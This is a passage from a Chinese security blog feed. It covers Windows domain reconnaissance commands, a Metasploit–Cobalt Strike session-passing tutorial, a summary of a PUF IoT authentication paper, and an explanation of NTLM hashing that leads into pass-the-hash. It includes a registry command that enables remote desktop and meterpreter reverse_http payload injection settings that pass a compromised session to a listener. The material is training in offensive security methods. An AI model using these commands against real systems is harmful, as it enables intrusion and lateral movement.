href="#5-4查看域控制器组" class="headerlink" title="5.4查看域控制器组"></a><font style="color:rgb(25, 27, 31);">5.4查看域控制器组</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net group “domain controllers” /domain<br></code></pre></td></tr></table></figure><h1 id="六、获取域内用户和管理员信息"><a href="#六、获取域内用户和管理员信息" class="headerlink" title="六、获取域内用户和管理员信息"></a><font style="color:rgb(25, 27, 31);">六、获取域内用户和管理员信息</font></h1><h2 id="6-1查询所有域用户列表"><a href="#6-1查询所有域用户列表" class="headerlink" title="6.1查询所有域用户列表"></a><font style="color:rgb(25, 27, 31);">6.1查询所有域用户列表</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net user /domain<br></code></pre></td></tr></table></figure><h2 id="6-2获取域内用户详细信息"><a href="#6-2获取域内用户详细信息" class="headerlink" title="6.2获取域内用户详细信息"></a><font style="color:rgb(25, 27, 31);">6.2获取域内用户详细信息</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">wmic useraccount get /all<br></code></pre></td></tr></table></figure><h2 id="6-3查看存在的用户"><a href="#6-3查看存在的用户" class="headerlink" title="6.3查看存在的用户"></a><font style="color:rgb(25, 27, 31);">6.3查看存在的用户</font></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">dsquery user<br><br>dsquery computer <span class="hljs-comment"># 查找目录中的计算机。</span><br>dsquery contact <span class="hljs-comment"># 查找目录中的联系人。</span><br>dsquery subnet <span class="hljs-comment"># 查找目录中的子网。</span><br>dsquery group <span class="hljs-comment"># 查找目录中的组。</span><br>dsquery ou <span class="hljs-comment"># 查找目录中的组织单位。</span><br>dsquery site <span class="hljs-comment"># 查找目录中的站点。</span><br>dsquery server <span class="hljs-comment"># 查找目录中的域控制器。</span><br>dsquery user <span class="hljs-comment"># 查找目录中的用户。</span><br>dsquery quota <span class="hljs-comment"># 查找目录中的配额。</span><br>dsquery partition <span class="hljs-comment"># 查找目录中的分区。</span><br>dsquery * <span class="hljs-comment"># 用通用的 LDAP 查询查找目录中的任何对象。</span><br>dsquery computer domainroot -limit <span class="hljs-number">65535</span> &amp;&amp; net group “domain computers” /domain  <span class="hljs-comment"># 列出该域内所有机器名</span><br>dsquery user domainroot -limit <span class="hljs-number">65535</span> &amp;&amp; net user /domain <span class="hljs-comment"># 列出该域内所有用户名</span><br>dsquery subnet <span class="hljs-comment">//列出该域内网段划分</span><br>dsquery group &amp;&amp; net group /domain <span class="hljs-comment"># 列出该域内分组</span><br>dsquery ou <span class="hljs-comment">//列出该域内组织单位</span><br>dsquery server &amp;&amp; net time /domain <span class="hljs-comment"># 列出该域内域控制器</span><br></code></pre></td></tr></table></figure><h2 id="6-4查询本地管理员组用户"><a href="#6-4查询本地管理员组用户" class="headerlink" title="6.4查询本地管理员组用户"></a><font style="color:rgb(25, 27, 31);">6.4查询本地管理员组用户</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net localgroup administrators<br></code></pre></td></tr></table></figure><h1 id="七、查询域管理员用户组"><a href="#七、查询域管理员用户组" class="headerlink" title="七、查询域管理员用户组"></a><font style="color:rgb(25, 27, 31);">七、查询域管理员用户组</font></h1><h2 id="7-1查询域管理员用户"><a href="#7-1查询域管理员用户" class="headerlink" title="7.1查询域管理员用户"></a><font style="color:rgb(25, 27, 31);">7.1查询域管理员用户</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net group “domain admins” /domain<br></code></pre></td></tr></table></figure><h2 id="7-2查询管理员用户组"><a href="#7-2查询管理员用户组" class="headerlink" title="7.2查询管理员用户组"></a><font style="color:rgb(25, 27, 31);">7.2查询管理员用户组</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net group “enterprise admins” /domain<br></code></pre></td></tr></table></figure><h1 id="八、远程桌面配置"><a href="#八、远程桌面配置" class="headerlink" title="八、远程桌面配置"></a>八、远程桌面配置</h1><h2 id="8-1-windows-打开-3389-远程连接命令"><a href="#8-1-windows-打开-3389-远程连接命令" class="headerlink" title="8.1 windows 打开 3389 远程连接命令"></a>8.1 windows 打开 3389 远程连接命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 终端执行</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br><span class="hljs-comment"># msf反斜杠保留&quot;和\</span><br>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/626445631">https://zhuanlan.zhihu.com/p/626445631</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>系统配置</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS与MSF联动</title>
    <link href="/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/"/>
    <url>/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="MSF-传递会话到-CS"><a href="#MSF-传递会话到-CS" class="headerlink" title="MSF 传递会话到 CS"></a>MSF 传递会话到 CS</h1><p> 首先正常 CS 连接到服务器上</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256015.png"></p><p>在 CS 上新建一个监听器 Beacon HTTP，具体 ip 配置和监听端口自行修正；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256245.png"></p><p>来到获取到会话的 MSF 中，将指定会话传递到 CS 中；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256590.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128   <span class="hljs-comment"># CS服务端IP</span><br><span class="hljs-built_in">set</span> lport 4444       <span class="hljs-comment"># CS服务端监听的端口号</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler True<br><span class="hljs-built_in">set</span> PrependMigrate True<br><span class="hljs-built_in">set</span> session 2  <span class="hljs-comment"># 会话id</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256130.png"></p><h1 id="CS-传递会话到-MSF"><a href="#CS-传递会话到-MSF" class="headerlink" title="CS 传递会话到 MSF"></a>CS 传递会话到 MSF</h1><p>先在 msf 上启动监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128<br><span class="hljs-built_in">set</span> lport 4445<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256859.png"></p><p>在 CS 上船舰一个 Foreign HTTP 监听，IP 和端口设置为 MSF 上监听的 IP 和端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256305.png"></p><p>在 CS 上右键待传递的会话，选择新建会话， 选择刚才创建的 Foreign HTTP 监听器</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256446.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256208.png"></p>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>工具教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于PUF的物联网设备安全认证</title>
    <link href="/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/"/>
    <url>/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p>原文下载：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/34580676/1732849412850-81b80258-3eea-4412-bb7d-56b82ff9ee8e.pdf">PUF-Based_Authentication_for_the_Security_of_IoT_Devices.pdf</a></p><h1 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h1><h2 id="1-1-基于-PUF-的物联网设备威胁"><a href="#1-1-基于-PUF-的物联网设备威胁" class="headerlink" title="1.1 基于 PUF 的物联网设备威胁"></a>1.1 基于 PUF 的物联网设备威胁</h2><p>基于 PUF 安全系统的主要威胁就是攻击者能够获取挑战的正确响应；</p><p>建模攻击是新兴攻击的一个例子，旨在复制PUF的挑战和响应行为，以克隆 PUF 设计生成的秘密密钥。</p><p>针对基于物理不可克隆功能（PUF）的物联网设备认证方案的建模攻击被分类为不同的类别。</p><h3 id="1-1-1-机器学习攻击"><a href="#1-1-1-机器学习攻击" class="headerlink" title="1.1.1 机器学习攻击"></a>1.1.1 机器学习攻击</h3><p>机器学习攻击被认为是最成功的复制 PUF 设计行为的攻击，一些基于机器学习的模型攻击已经分析出模仿 PUFs 行为，算法的有效性取决于不同的 PUF 设计的复杂性。</p><h3 id="1-1-2-中间人攻击"><a href="#1-1-2-中间人攻击" class="headerlink" title="1.1.2 中间人攻击"></a>1.1.2 中间人攻击</h3><p>攻击者通过提取和记录服务器和设备之间通信的数据包，并且提取出其中的挑战-响应对(CRPs)进行存储。在获得一组 CRPs 后，可以通过利用机器学习对 PUF 进行建模。</p><h3 id="1-1-3-基于硬件的侧信道攻击"><a href="#1-1-3-基于硬件的侧信道攻击" class="headerlink" title="1.1.3 基于硬件的侧信道攻击"></a>1.1.3 基于硬件的侧信道攻击</h3><p>侧信道攻击利用各种参数，如电流泄漏、电压变化和功耗，对半导体集成电路（IC）和物联网（IoT）设备发起攻击。这些攻击利用侧向挑战参数来模拟稳健的 PUF 设计。</p><h1 id="二、基础组件分析"><a href="#二、基础组件分析" class="headerlink" title="二、基础组件分析"></a>二、基础组件分析</h1><h2 id="2-1-研究成果"><a href="#2-1-研究成果" class="headerlink" title="2.1 研究成果"></a>2.1 研究成果</h2><p><font style="color:rgb(42, 43, 46);">提出了一种轻量级的基于异或环振荡器 PUF （XOR-ROPUF）的物联网系统安全认证方案。</font></p><p><font style="color:rgb(42, 43, 46);">提出的管理方案在验证机构和物联网设备之间进行认证，保证数据的一致性和完整性，降低网络攻击的风险。</font></p><h2 id="2-2-实现方法"><a href="#2-2-实现方法" class="headerlink" title="2.2 实现方法"></a><font style="color:rgb(42, 43, 46);">2.2 实现方法</font></h2><p>使用延迟 PUF 在物联网设备上进行身份认证；</p><h3 id="2-2-1-异或-环振荡器-PUF（XOR-ROPUF）"><a href="#2-2-1-异或-环振荡器-PUF（XOR-ROPUF）" class="headerlink" title="2.2.1 异或-环振荡器 PUF（XOR-ROPUF）"></a>2.2.1 异或-环振荡器 PUF（XOR-ROPUF）</h3><p>提出的 XOR-ROPUF 增强了熵，使设计能够为安全可信的物联网应用生成挑战-响应对，这些应用需要稳健、轻量级的密钥和密码密钥生成。</p><p>轻量级的 PUF 设计，低消耗并且能够安全、有效地为物联网设备生成秘密密钥，包括物联网设备认证的鲁棒性；</p><p>图 2 显示的是已实现的 XOR-ROPUF，从 PUF 生成的响应反馈到挑战生成器。XOR 网络接收来自挑战生成器的挑战，并将响应结合起来生成新的挑战。PUF 设计采用 16 位挑战并生成 16 位响应。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438767.png"></p><h3 id="2-2-2-基于-PUF-的认证方案"><a href="#2-2-2-基于-PUF-的认证方案" class="headerlink" title="2.2.2 基于 PUF 的认证方案"></a>2.2.2 基于 PUF 的认证方案</h3><p>使用上述提出的轻量级 XOR-ROPUF 进行物联网设备的身份认证，下图是物联网设备与认证服务器之间为确保数据一致性和完整性而提出的方案。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438303.png"></p><p>所提出的基于 PUF 的物联网设备认证方案降低了认证漏洞的风险，提出的技术可通过与待认证的物联网设备通信来存储和更新挑战与响应对。</p><p>基于 PUF 的认证方案由两个步骤组成，分别是注册和认证，上述保证了认证过程的安全；</p><ol><li>第一阶段：注册</li></ol><p>第一阶段注册的过程中，认证端通过发送 n 个挑战给客户端，获取与之响应的 n 个响应，并将挑战-响应对 CRPs 记录在一个安全的数据库中； 每个客户端都会经过该过程进行注册，具体流程如下图所示；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438019.png"></p><ol start="2"><li>第二阶段：认证</li></ol><p>认证端通过物联网设备的唯一 ID 辨认物联网设备，认证端在从数据库中选取该设备的 CRPs 的任意挑战发送给客户端（物联网设备）获取其响应与数据库中存储的 CRP 进行对比，一致则认为正确；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438158.png"></p><h1 id="三、研究创新点"><a href="#三、研究创新点" class="headerlink" title="三、研究创新点"></a>三、研究创新点</h1><p><font style="color:rgb(42, 43, 46);">XOR-ROPUF的硬件实现利用FPGA固有的物理特性来实现安全、可靠和可信的物联网应用。</font></p><p><font style="color:rgb(42, 43, 46);">所提出的基于安全PUF的方案消除了传统方法的一些缺点，并解释了如何使用PUF来构建低成本的身份验证方案。提出的基于puf的安全增强方案解决了高安全性物联网网络的需求。</font></p><h1 id="四、实验结果分析"><a href="#四、实验结果分析" class="headerlink" title="四、实验结果分析"></a>四、实验结果分析</h1><h2 id="4-1-实验结果"><a href="#4-1-实验结果" class="headerlink" title="4.1 实验结果"></a>4.1 实验结果</h2><blockquote><p><strong>Art ix 7 FPGAs</strong>指的是 <strong>Xilinx Artix-7 系列现场可编程门阵列（Field Programmable Gate Arrays，FPGAs）</strong></p><ol><li><strong>FPGA 是什么？</strong><ul><li>FPGA 是一种可编程的集成电路，用户可以根据需求设计电路功能。</li><li>它包含可配置逻辑块（CLBs）、存储单元、输入&#x2F;输出单元以及可编程互连。</li></ul></li><li><strong>Artix-7 系列的特点</strong><ul><li><strong>制造工艺</strong>：采用 28nm 制造工艺，具备高性能和低功耗的特性。</li><li><strong>适用场景</strong>：专为功耗敏感的中低端应用设计，例如嵌入式系统、工业控制和信号处理。</li><li><strong>性能优势</strong>：<ul><li>低功耗：相比更高性能的 Kintex 和 Virtex 系列，Artix-7 的功耗更低。</li><li>成本效益：价格较低，适合资源受限的应用。</li></ul></li></ul></li><li><strong>主要特性</strong><ul><li>支持可编程逻辑设计，适用于实现 PUF 的复杂逻辑和测量功能。</li><li>提供高速 I&#x2F;O 接口，用于与外部设备通信。</li><li>集成硬核模块（如 DSP 块和存储单元），方便处理数据。</li></ul></li></ol></blockquote><p>在上述认证过程中，只有进行两次挑战-响应验证成果，才认为该物联网设备成功进行身份认证；</p><p>该实验设计是在安装在Diligent Nexys 4板上的Xilinx Artix 7 fpga上实现的， 通过与其他相似设计方案的一致性、唯一性、位混叠、可靠性进行对比，实验结果如下表所示：</p><table><thead><tr><th align="center">设计</th><th align="center"><font style="color:rgb(42, 43, 46);">一致性</font></th><th align="center"><font style="color:rgb(42, 43, 46);">唯一性</font></th><th align="center"><font style="color:rgb(42, 43, 46);">位混叠</font></th><th align="center"><font style="color:rgb(42, 43, 46);">可靠性</font></th></tr></thead><tbody><tr><td align="center">XOR-ROPUF</td><td align="center">50.76%</td><td align="center">49.40%</td><td align="center">48.35%</td><td align="center">99.8%</td></tr><tr><td align="center">Inverter ROPUF</td><td align="center">47.02%</td><td align="center">45.15%</td><td align="center">47.20%</td><td align="center">98.0%</td></tr><tr><td align="center">ROPUF</td><td align="center">50.56%</td><td align="center">47.24%</td><td align="center">50.56%</td><td align="center">99.14%</td></tr><tr><td align="center">APUF</td><td align="center">55.69%</td><td align="center">7.20%</td><td align="center">19.57%</td><td align="center">99.76%</td></tr></tbody></table><h2 id="4-2-可延展方向"><a href="#4-2-可延展方向" class="headerlink" title="4.2 可延展方向"></a>4.2 可延展方向</h2><p>尝试设计提高一致性、唯一性和位混叠的 PUF 身份认证设计方案；</p><p>主要的修改方向是如何生成挑战-响应对（CRPs）。</p>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>硬件安全</tag>
      
      <tag>PUF</tag>
      
      <tag>身份认证</tag>
      
      <tag>物理不可克隆函数</tag>
      
      <tag>物联网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows的NTLM认证和hash攻击</title>
    <link href="/2024/11/30/Windows%E7%9A%84NTLM%E8%AE%A4%E8%AF%81%E5%92%8Chash%E6%94%BB%E5%87%BB/"/>
    <url>/2024/11/30/Windows%E7%9A%84NTLM%E8%AE%A4%E8%AF%81%E5%92%8Chash%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Windows-的-Hash"><a href="#一、Windows-的-Hash" class="headerlink" title="一、Windows 的 Hash"></a>一、Windows 的 Hash</h1><p>Windows系统将用户的密码保存在<strong>安全帐户管理器</strong>（SAM，Security Accounts Manager）中，存储的是用户密码的哈希值，而不是明文密码。默认情况下，密码哈希值使用<strong>NTLM</strong>（NT LAN Manager）哈希算法，早期版本的Windows使用LM（LAN Manager）哈希，但现在几乎所有版本的Windows都使用NTLM。</p><ul><li><strong>NTLM哈希</strong>：它是一个固定长度（16字节）的散列值，Windows在验证用户密码时并不会直接存储密码，而是存储密码的哈希值。当用户登录时，输入的密码经过哈希后与存储在SAM中的哈希值进行比较。</li></ul><p>在 Windows 中，最常见的两种认证体系便是 **NTLM **认证和 **Kerberos **认证。</p><p><strong>本机</strong>用户的密码哈希是放在 本地的 <strong>SAM</strong> 文件 里面，<strong>域内</strong>用户的密码哈希是存在域控的 <strong>NTDS.dit</strong> 文件 里面。在渗透测试中，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中导出所有用户的Hash。导出来的哈希经常会看到这样的格式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Administrator:<span class="hljs-number">500</span>:AAD3B435B51404EEAAD3B435B51404EE:<span class="hljs-number">31</span>D6CFE0D16AE931B73C59D7E0C089C0:::<br></code></pre></td></tr></table></figure><p>其中的AAD3B435B51404EEAAD3B435B51404EE是LM Hash，31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash。</p><h2 id="1-1-LM-Hash"><a href="#1-1-LM-Hash" class="headerlink" title="1.1 LM Hash"></a>1.1 LM Hash</h2><p>LM Hash 的全称为 LAN Manager Hash，这是 Windows 中最早用的加密算法。</p><p>LM Hash的计算方式如下：</p><ol><li>用户的密码转换为大写，密码转换为 16 进制字符串，不足 14 字节将会用 0 来在后面补全</li><li>密码的 16 进制字符串被分成两个 7byte 部分。每个部分转换成比特流，并且长度为 56bit，长度不足使用 0 在左边补齐长度</li><li>再分 7bit 为一组，每组末尾加 0，再组成一组；</li><li>上述不走得到的两组，分别作为 key 为“KGS!@#$%”进行 DES 加密</li><li>将加密后的两组拼接在一起，得到最终的 LM Hash 值；</li></ol><h2 id="1-2-NTLM-Hash"><a href="#1-2-NTLM-Hash" class="headerlink" title="1.2 NTLM Hash"></a>1.2 NTLM Hash</h2><p>为了解决 LM Hash 加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。</p><p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。（因此后面我们将不再介绍LM Hash）如果空密码或者不储蓄 LM Hash 的话，我们抓到的LM Hash是AAD3B435B51404EEAAD3B435B51404EE。所以在 Windows 7 中我们看到抓到 LM Hash 都是AAD3B435B51404EEAAD3B435B51404EE，这里的 LM Hash 已经没有任何价值了。</p><p>NTLM Hash 的计算方法如下：</p><ol><li>先将用户密码转换为十六进制格式；</li><li>将十六进制格式的密码进行 Unicode 编码；</li><li>使用 MD4 摘要算法对 Unicoe 编码数据进行 Hash 计算；</li></ol><h1 id="二、NTLM-身份认证"><a href="#二、NTLM-身份认证" class="headerlink" title="二、NTLM 身份认证"></a>二、NTLM 身份认证</h1><p>Windows 的 NTLM 认证就是利用 NTLM Hash 进行的认证，可以分为 本地认证 和 网络认证 两种方式。NTLM 的网络认证，既可用于域内的认证服务，又可用于工作组环境。NTLM 有 NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p><h2 id="2-1-NTLM-本地认证"><a href="#2-1-NTLM-本地认证" class="headerlink" title="2.1 NTLM 本地认证"></a>2.1 NTLM 本地认证</h2><p>用户在 Windows 本地登录时，用户输入的密码会经过 NTLM Hash 编码后与 SAM 文件中的 NTLM Hash 进行比较。用户的密码会以 NTLM Hash 的形式存储在本地计算机的 SAM 文件中，SAM 文件路径为 <code>%SystemRoot%\system32\config\SAM</code>。</p><p>当用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。lsass.exe 是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对SAM数据库比较认证。</p><h2 id="2-2-NTLM-在工作组环境中的认证"><a href="#2-2-NTLM-在工作组环境中的认证" class="headerlink" title="2.2 NTLM 在工作组环境中的认证"></a>2.2 NTLM 在工作组环境中的认证</h2><p>NTLM 在网络环境中的认证采用的是一种 Challenge&#x2F;Response 验证机制，由三种消息组成：</p><ul><li>type 1：协商</li><li>type 2：质询</li><li>type 3：身份验证</li></ul><p>下面详细介绍一下 NTLM 在工作组环境中的工作机制。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202411301131956.png"></p><ol><li>首先，如果客户端需要访问服务器的某个服务是需要进行身份认证的。于是，客户端要输入服务器的用户名和密码进行验证，此时客户端本地会缓存一份服务器密码的 NTLM Hash 值。客户端发送 <strong>Type1 Negotiate</strong> 协商消息去协商需要认证的主体、用户（服务器端的用户名）、机器以及需要使用的安全服务等信息。</li><li>服务端接收到客户端发送过来的 Type1 消息后，会读取其中的内容，并从中选择出自己所能接受的服务内容、加密等级、安全服务等。然后传入 <strong>NTLM SSP</strong>，得到 <strong>Type2 Challenge</strong> 消息（被称为 Challenge 挑战消息），并将此 Type2 消息发回给客户端。这个 Type2 消息中包含了一个由服务端生成的16位随机值，此随机值被称为 Challenge，服务器也会将该 Challenge 保存起来。</li></ol><blockquote><ol><li>SSPI</li></ol><p>SSPI（Security Support Provider Interface），即 <strong>安全服务提供接口</strong>，这是 Windows 定义的一套接口，该接口定义了与安全有关的功能<a href="https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782?utm_source=glcblog&spm=1001.2101.3001.7020">函数</a>，包含但不限于：</p><ul><li>身份验证机制</li><li>信息完整性</li><li>为其他协议提供的会话安全机制</li></ul><ol start="2"><li>SSP</li></ol><p>SSP（Security Service Provider），即 <strong>安全服务提供</strong>，它是 SSPI 的实现者，是对 SSPI 相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><p>NTLM SSP</p><p>Kerberos</p><p>Digest SSP</p><p>Cred SSP</p><p>……</p><p>在系统层面，SSP 就是一个 dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 <strong>Challenge&#x2F;Response 验证</strong>机制。而 Kerberos SSP 实现的就是<strong>基于 ticket 的身份验证</strong>机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p></blockquote><ol start="3"><li>客户端收到服务端返回的 Type2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 <strong>Net-NTLMHash</strong>，最后将 <strong>Net NTLM-Hash</strong> 封装到 Type 3 Authenticate 消息中（被称为 Authenticate 认证消息），发往服务端。</li><li>服务器在收到 Type 3 的消息之后，用自己的密码的 NTLM-Hash 对 Challenge 进行加密，并比较自己计算出的 Net NTLM-Hash 认证消息和客户端发送的认证消息是否匹配。如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败。</li></ol><h2 id="2-3-NTLM-在域环境中的认证"><a href="#2-3-NTLM-在域环境中的认证" class="headerlink" title="2.3 NTLM 在域环境中的认证"></a>2.3 NTLM 在域环境中的认证</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202411301131454.png"></p><p>NTLM 在域环境中的认证的前三步与NTLM 在工作组环境中的认证是一样的，不同的地方开始出现在第四步：</p><ol start="4"><li>服务器接收到客户端发送来的 Type3 消息后，取出其中的 <strong>Net NTLM-Hash</strong> 值，并向域控制器发送针对客户端的验证请求。该请求主要包含以下三方面的内容：用户名（服务器端的用户名）、原始的 Challenge 和 加密后的 Challenge（即Net NTLM-Hash）。</li><li>然后域控制器会根据用户名获取该帐号的密码哈希值 NTLM Hash，用哈希值对原始的 Challenge 进行加密得到 <strong>Net NTLM-Hash</strong> 。如果加密后的 Challenge 和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。并将验证结果发给服务器。</li><li>服务器根据域控制器返回的结果，对客户端进行回复。</li></ol><h1 id="三、-Net-NTLM-Hash"><a href="#三、-Net-NTLM-Hash" class="headerlink" title="三、 Net-NTLM Hash"></a>三、 Net-NTLM Hash</h1><p>Net-NTLM Hash 与 NTLM Hash 不一样。NTLM 认证的第三步中，客户端收到服务端返回的 Type2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 Net-NTLM Hash，最后将 Net NTLM Hash 封装到 Type3 Authenticate 消息中，发往服务端。也就是说 Net-NTLM Hash 是网络环境下 NTLM 认证的散列值。NTLM v1 响应和 NTLM v2 响应对应的就是 Net-NTLM Hash 分为 Net-NTLM Hash v1 和 Net-NTLM Hash v2。</p><ul><li>Net-NTLM Hash v1的格式为：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">username::hostname:LM response:NTLM response:challenge<br></code></pre></td></tr></table></figure><ul><li>Net-NTLM Hash v2的格式为：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">username::domain:challenge:HMAC-MD5:blob<br></code></pre></td></tr></table></figure><p>Net-NTLM Hash 不能像 NTLM Hash 一样被攻击者用来进行哈希传递，但是攻击者可以使用各种方法截获客户端与 Server 认证过程中的 Net-NTLM Hash，然后对其进行明文爆破，或者直接用来进行 NTLM 中继攻击。</p><h1 id="四、-NTLM-认证的相关安全问题"><a href="#四、-NTLM-认证的相关安全问题" class="headerlink" title="四、 NTLM 认证的相关安全问题"></a>四、 NTLM 认证的相关安全问题</h1><p>NTLM 认证固然存在不少安全问题，大体有以下几种：</p><ul><li>哈希传递攻击</li><li>利用 NTLM 进行内网信息收集</li><li>NTLM Relay</li></ul><h2 id="4-1-哈希传递攻击（PTH）"><a href="#4-1-哈希传递攻击（PTH）" class="headerlink" title="4.1 哈希传递攻击（PTH）"></a>4.1 哈希传递攻击（PTH）</h2><p><font style="color:rgb(77, 77, 77);">哈希传递（Pass The Hash）攻击简称 PTH，该方法通过找到与账户相关的密码散列值（NTLM Hash）来进行攻击。</font></p><p><font style="color:rgb(77, 77, 77);">由于在 Windows 系统 NTLM 认证的 Type3 消息计算 Response 的时候，客户端是使用用户的 